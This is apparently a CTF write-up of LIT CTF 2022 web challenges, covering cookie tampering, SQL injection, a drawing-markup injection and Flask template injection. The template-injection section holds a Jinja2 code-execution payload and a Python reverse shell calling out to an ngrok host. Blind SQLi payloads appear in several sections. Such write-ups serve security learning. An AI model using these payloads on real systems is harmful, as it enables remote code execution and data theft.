---
title: LIT CTF 2022
description: Web challenge write up in LIT CTF 
summary: Write up of some Web challenge
cover: ./cover.jpg
published: '2022-07-25T22:00:00.000+08:00'
updated: '2022-07-25T12:00:00.000+08:00'
tags:
  - [ ctf ]
---

# Personal Website

Just view the source

![image](https://user-images.githubusercontent.com/75429369/180771571-37b33b1b-9c8e-4dfd-a74a-b74586ef1466.png)

![image](https://user-images.githubusercontent.com/75429369/180771609-d4e40515-c686-4036-ad82-2192964ab35d.png)

![image](https://user-images.githubusercontent.com/75429369/180771641-c4539391-2aac-4600-9a43-1e8d88e31763.png)

# Kevin's Cookies

Change the cookie to 17 and we'll get the flag

![image](https://user-images.githubusercontent.com/75429369/180771724-98be830c-0cdf-4762-bf77-a43fd19dd06e.png)

# Guess The Pokemon

![image](https://user-images.githubusercontent.com/75429369/180771879-48ca5cb4-fe0e-46ca-af70-3230a9c24899.png)

![image](https://user-images.githubusercontent.com/75429369/180771897-f4a33d38-0871-44cd-9751-f992dc30733d.png)

An easy sqli challenge, the author has filtered out the `'`, `\` and `"`. But the query is so simple that we can simply bypass it using many method, here's some of it

```
1 or 1=1 --
```

```
(select * from pokemon)
```

# Among Us

The challenge gave us a site like this 

![image](https://user-images.githubusercontent.com/75429369/180772849-96d10748-05ba-4a42-942e-607177b3ef5d.png)

No source, I just do anything I can do with this site. After a while, I saw the word `HEAD` on the main page, so I just went to change the method to `HEAD` and realised it was redirected from a sussy web site which stores the flag

![image](https://user-images.githubusercontent.com/75429369/180773302-23bd9417-ff7e-46fa-a62c-6aaf4afddb30.png)

![image](https://user-images.githubusercontent.com/75429369/180773321-b3dff0fe-4988-4fe6-82e8-9fc1b85da4d1.png)

# CTF

First, I want to kudos to `CodeTiger#1869` who made lots of efforts on making this challenge, the idea was so creative and interesting. It's a game website called CTF and has a rules to play, here's the rule

![image](https://user-images.githubusercontent.com/75429369/180773831-bbcc0eaa-32da-4831-b065-d79c4556daea.png)

![image](https://user-images.githubusercontent.com/75429369/180773865-7178173b-ac49-45c4-a328-2a0a6a10b626.png)

![image](https://user-images.githubusercontent.com/75429369/180773880-d1d01670-155d-40be-a4ed-5acd4184ceb9.png)

Basically, every users can register and on the profile site, they'll have their own flag. The game is simple - the more flags a user have in their profile when the bot visit it, the more change you get to win the game. But here's the thing, people thinks it's better to hide their flag on somewhere else not on their profile so when the bot visit, they'll have nothing and get 0-flag-point on the scoreboard like this :D

![image](https://user-images.githubusercontent.com/75429369/180774683-a1fde4ce-05a8-416f-87a1-2fe986327e78.png)

So, I just store my own flag on my profile and when the bot visit, I will get 1 point (more than like 99% players at that time ...) so I've won the game by doing nothing :D

![image](https://user-images.githubusercontent.com/75429369/180774887-f4eb7605-7e55-466e-878d-a8db1b929746.png)

I really do like this challenge and I think if people did this decently it would be fun as hell LOL. Poor CodeTiger xDDDD

![image](https://user-images.githubusercontent.com/75429369/180775078-3a84d57d-d7eb-4954-a99d-3a7de2523bff.png)

# EYANGCH Fan Art Maker

The challenge is a site where we can use 3 types of literals like  `<shape></shape>`, `<line></line>` and `<text></text>` to create a fan-art

![image](https://user-images.githubusercontent.com/75429369/180775308-00cc0038-ead4-4df0-9be1-3ca1cd89d989.png)

After submiting, we'll get this

![image](https://user-images.githubusercontent.com/75429369/180775364-dd799462-ed19-406a-a5a9-c260752a26c3.png)

We can see the flag but it's covered by some annoying lines. But I didn't input anything in the fields but it already had that fanart, maybe it was predrawed. Let's look at the generate fanart source

```javascript
app.post('/makeArt', (req, res) => {
	var code = req.body.code;

	var flag = `
<component name="flag">
	<text color="black" font="bold 10pt Arial">` + (process.env.FLAG ?? "ctf{flag}") + `</text>
</component>

<flag x="100" y="400"></flag>
	`;

	var eyangComp = `
<component name="EYANGOTZ">
	<component name="eyes1">
		<line x1="10" y1="80" x2="30" y2="60" color="#1089f5" width="20"></line>
		<line x1="30" y1="60" x2="60" y2="70" color="#1089f5" width="20"></line>
	</component>
	<component name="eyes2">
		<line x1="110" y1="50" x2="130" y2="30" color="#1089f5" width="20"></line>
		<line x1="130" y1="30" x2="160" y2="40" color="#1089f5" width="20"></line>
	</component>
	<component name="mouth">
		<line x1="40" y1="200" x2="50" y2="220" color="#1089f5" width="20"></line>
		<line x1="50" y1="220" x2="190" y2="200" color="#1089f5" width="20"></line>
		<line x1="190" y1="200" x2="200" y2="180" color="#1089f5" width="20"></line>
	</component>
	<text x="30" y="30" font="bold 10pt Arial">EYANG SO OTZ</text>
</component>
<EYANGOTZ x="10" y="50"></EYANGOTZ>
<EYANGOTZ x="350" y="100"></EYANGOTZ>
<EYANGOTZ x="50" y="190"></EYANGOTZ>
<EYANGOTZ x="130" y="200"></EYANGOTZ>
<EYANGOTZ x="200" y="190"></EYANGOTZ>
<EYANGOTZ x="150" y="300"></EYANGOTZ>
	`

	code = "<fanart>" + flag + eyangComp + code + "</fanart>";

	generateArt(code,res);
});
```

Like I said, It has defined a component, used it to covered the flag and then treat our input code. Though it was not an easy challenge but the author has made a mistake :D, he literally shows us the flag component which stores the flag and since the website treat our input as code like component so why don't we just input that flag component :D ?

```javascript
<flag x="100" y="100"></flag>
```

I have changed the ratio of x and y to not get covered by these annoying lines

![image](https://user-images.githubusercontent.com/75429369/180777016-fb5fac32-eca6-4294-9410-b2c2c0a4943e.png)

:DDDDDDDDDDDDDDDDDDD

# EYANGCH Fan Art Maker 2.0

Oh yeah of course, in the middle of the event, the author has dropped a new version of the challenge to prevent unintended solution. He made a custom password attribute and add it into flag component.

```javascript
app.post('/makeArt', (req, res) => {
	var code = req.body.code;
	const secretPassword = require("crypto").randomBytes(8).toString('hex');
	var flag = `
<component name="flag" password="` + secretPassword + `">
	<text color="black" font="bold 10pt Arial">` + (process.env.FLAG ?? "ctf{flag}") + `</text>
</component>

<flag x="100" y="400" password="` + secretPassword + `"></flag>
	`;
```

Though It was perfect but nah, he just made the flag component safe and prevent player to use it but these annoying lines component doesn't have that endowment. So we just redefine that component to nothing or anything you want, so these annoying lines will disappear and the flag will show up :D

```javascript
<component name="EYANGOTZ">
<text x="10" y="10" font="bold 10pt Arial">free flag</text>
</component>
```

![image](https://user-images.githubusercontent.com/75429369/180777954-51085d5f-e9ad-4169-9b22-fdc961f60e85.png)

# Amy The Hedgehog

![image](https://user-images.githubusercontent.com/75429369/180778040-6da0b50d-11a9-4d8f-b15d-9da5252a81c1.png)

![image](https://user-images.githubusercontent.com/75429369/180778066-6c9546ca-39af-4d9b-9567-2120419ed143.png)

Another sqli challenge (the description said it all ...), let's test it out

```
' or 1=1 --
```

![image](https://user-images.githubusercontent.com/75429369/180778178-7aab1cc0-90c8-49c0-8037-c699d5a13494.png)

```
' or 1=0 --
```

![image](https://user-images.githubusercontent.com/75429369/180778213-132fced2-1f97-438a-b47f-8c4e9395e1fc.png)

Easy to know it's blind sqli using boolean based, I'll leave the payload for exploit here because I have deleted the script and too lazy to redo it :P

Leak table name
```
' or (select hex(substr(tbl_name,1,1)) from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%') = hex('n') --
```

Leak table info
```
' or (select hex(substr(sql,1,1)) from sqlite_master where type!='meta' and sql NOT NULL and name='names') = hex('a') --
```

Get the flag
```
' or (select hex(substr(name,1,1)) from names) = hex('L') --
```

# Flushed Emoji

The challenge gave us a site and when we click on the flushed emoji button, it will have a pop up which has a login form like this

![image](https://user-images.githubusercontent.com/75429369/180778854-fcc4f3ba-2e6a-4f63-988e-ac12bf3d8e6b.png)

main.py
```python
import sqlite3
from flask import Flask, render_template, render_template_string, redirect, url_for, request
import requests;
import re;

app = Flask(__name__)


def alphanumericalOnly(str):
  return re.sub(r'[^a-zA-Z0-9]', '', str);

@app.route('/', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':

    username = request.form['username']
    password = request.form['password']

  
    if('.' in password):
      return render_template_string("lmao no way you have . in your password LOL");

    r = requests.post('[Other server IP]', json={"username": alphanumericalOnly(username),"password": alphanumericalOnly(password)}); 
    print(r.text);
    if(r.text == "True"):
      return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss.");
    return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");

  return render_template("index.html");


app.run(host='127.0.0.1',port=8081,debug=True)
```

Oh python and `render_template_string` filtered dot, sure SSTI, let's prove it by testing some payload

```
{{7*7}}
```


![image](https://user-images.githubusercontent.com/75429369/180779189-20aaf81a-a7de-4c09-b814-2b207f95edfe.png)

In common ctf challenge, when it's a ssti challenge it means we just have to RCE it and cat the flag, but in this challenge it will get our input and request it to another server and we know nothing about that server but the source, let's read it

![image](https://user-images.githubusercontent.com/75429369/180779536-d8b7e219-232e-4945-aa74-447042a678b2.png)

data-server/main.py
```python
import sqlite3
from flask import Flask, render_template, render_template_string, redirect, url_for, request

con = sqlite3.connect('data.db', check_same_thread=False)
app = Flask(__name__)

flag = open("flag.txt").read();

cur = con.cursor()

cur.execute('''DROP TABLE IF EXISTS users''')
cur.execute('''CREATE TABLE users (username text, password text)''')
cur.execute(
    '''INSERT INTO users (username,password) VALUES ("flag","''' + flag + '''") '''
)


@app.route('/runquery', methods=['POST'])
def runquery():
  request_data = request.get_json()
  username = request_data["username"];
  password = request_data["password"];

  print(password);
  
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");

  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";

app.run(host='127.0.0.1',port=8080,debug=True)
```

In this server, they'll check our input of username and password from the main server, the query is sqli-able so we just need to inject it and leak the flag easily. But it wasn't that easy, the data server only response when the main server request to it, so it has to be internal server. After analysing, we'll know the workflow of the website.

- First the main server will check if our input username and password has any dot in it, if don't, they will send a request to data server with our input username and password (and alphanumericalOnly) as json.
- The data server will receive the request and treat our input by adding it to a query which check the username and password and then return True if it right or False if not (boolean based sqli)
- Come back to the main server, if the data server return True, it will render `OMG you are like so good at guessing our flag I am lowkey jealoussss.` which means we have input the right flag, but it's impossible to has this show up because we can't input `{` since the request of data is alphanumerical only. So it'll always return `ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)`

The thing we want is the True and False return from the data server, not the render of main server, which means we have to make the request from the main server, so it will be able to connect with internal server. To do that, we have to RCE the server first.

```python
{{lipsum['__globals__']['os']['popen']('ls')['read']()}}
```

![image](https://user-images.githubusercontent.com/75429369/180784191-46f382c4-cb43-4e47-be93-99625bd6f9dd.png)

We want to know the IP of the data server to make request to it, so we have to read the `main.py`. Since it has the dot in the name file so I decided to get reverse shell to intuitively do the challenge.

I'll use the inject-directly-to-config-and-popen-it method (you can find out how in my ImaginaryCTF write up), i won't explain it here.

```
POST /?t=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%220.tcp.ap.ngrok.io%22%2C12720%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27 HTTP/1.1
Host: litctf.live:31781
Content-Length: 145
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://litctf.live:31781
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://litctf.live:31781/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=assdf&password=%7B%7B%28config%7Cattr%28dict%28up%3Dup%2Cdate%3Ddate%29%7Cjoin%29%29%28t%3Drequest%5B%27args%27%5D%5B%27t%27%5D%29%7D%7D
```

![image](https://user-images.githubusercontent.com/75429369/180790318-8867c96d-eaa5-4db3-8f22-32ccfcb4d1c1.png)

Read `{{config}}`

![image](https://user-images.githubusercontent.com/75429369/180790436-38012c35-e814-435d-b3a3-14946f3a2710.png)

Popen it

```python
{{lipsum['__globals__']['os']['popen'](config['t'])}}
```

![image](https://user-images.githubusercontent.com/75429369/180790561-1e502da6-0c0d-4469-b1bf-759927a0fec6.png)

![image](https://user-images.githubusercontent.com/75429369/180790589-b0937a51-941a-4be2-b525-1ec708ac0684.png)

Let's find out the IP 

![image](https://user-images.githubusercontent.com/75429369/180790704-9a3ded75-609b-4aae-838f-149dd2d83ffb.png)

So we got all we need, noticed that `requests` module was installed so we just use it to request to `http://172.24.0.8:8080/runquery`

![image](https://user-images.githubusercontent.com/75429369/180791111-0382a5c9-61a5-4108-b43a-75b4cec28c19.png)

```terminal
python3 -c "import requests; r=requests.post('http://172.24.0.8:8080/runquery', json={'username':'\'/**/or/**/(select/**/hex(substr(password,1,1))/**/from/**/users/**/where/**/username=\'flag\')/**/=/**/hex(\'L\')/**/--','password':'no'}); print(r.text)"
```

![image](https://user-images.githubusercontent.com/75429369/180793045-76e205d3-a38d-4ca8-b4f4-7de0fc51c757.png)

Now just write a script for all that :D

# EYANGCH Fan Art Maker (intended solution)

I'm very curious about the actual solution so let's just find out what's the intended solution of this chall. Let's read the code again (I've missed the `views` folder for the hold event :D)

![image](https://user-images.githubusercontent.com/75429369/180924860-ad5d0c06-4def-4d6d-81eb-179e18eec876.png)

```html
<!DOCTYPE HTML>
<html>
    <head>
        <title>EYANGCH Fan Art Maker <3</title>
        <style>
            .bg{
                background-image: url("https://cdn.discordapp.com/avatars/622575440305061910/e0fa5d8c91cc24f83af648736072d330.webp?size=256");
                background-repeat: repeat;
                opacity: 0.3;
                top: 0;
                left: 0;
                right: 0;
                position: absolute;
                z-index: -1; 
                height: 300%; 
            }
            pre code {
                background-color: #eee;
                border: 1px solid #999;
                display: block;
                padding: 10px;
                font-size: 18px;
            }

            textarea {
            	width: 50%;
            	height: 400px;
                font-size: 18px;
            }
        </style> 
    </head>
    <body>
        <div class="bg"></div>
        <h1>EYANG OTZ OTZ OTZ!!! 💖💖💖</h1>
        <img src="data:image/png;base64, <%= img %>"></body>
    </body>
    <% if(rick) { %>
    <script type="text/javascript">
        alert("How dare you make an error on the EYANG FAN ART!");
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley";
    </script>
    <% } %>
</html>
```

If our input code leads an error after generate the fanart, it'll be alert an error and then redirect to rick roll video. Let's look at the class component

```javascript
class component {
	constructor(name,parent) {
		this.name = name;
		this.parent = parent;
		this.dx = 0;
		this.dy = 0;
		this.x = 0;
		this.y = 0;
		// <text> <shape> <line> are literals
		this.literals = [];

		if(this == parent) throw "Error: parent cannot be itself!";
	}

	toString() { return this.name; }
}
```

It checks if the component equals to the parent, it will throw an error which will alert. So what we gonna do here is we'll define a new component which has its parent equals to parent and we'll check every single word of flag component, so if it's right, it'll throw the error because of its `component == parent` just like the code. And we can also see the `toString()` function which means it will return to us a string, so we'll use `innerText` to have it show up.

final payload (by the author)
```javascript
<component name="clown">
<component name="parent">
<component name="flag">
<component name="literals">
<component name="0">
<component name="innerText">
<component name="0"> <!-- this is the ith character -->
<component name="L"> <!-- this is the character that we want to check -->

</component>
</component>
</component>
</component>
</component>
</component>
</component>
</component>
```

![image](https://user-images.githubusercontent.com/75429369/180927711-2e2e79c4-0cfa-405b-9878-ba095ee61805.png)

![image](https://user-images.githubusercontent.com/75429369/180927801-55348145-b235-46f2-8f38-77a12d1bdf43.png)

Really really creative challenge :D. ...




> "So yeah, didn't solved all the challenges but LITCTF was really fun to play."

# Honorable Mention

Guess what, I got the HM lol xD, tks @CodeTiger#1869 

![image](https://user-images.githubusercontent.com/75429369/183063502-b8b51ca8-019a-46da-9955-8f3d649976d8.png)
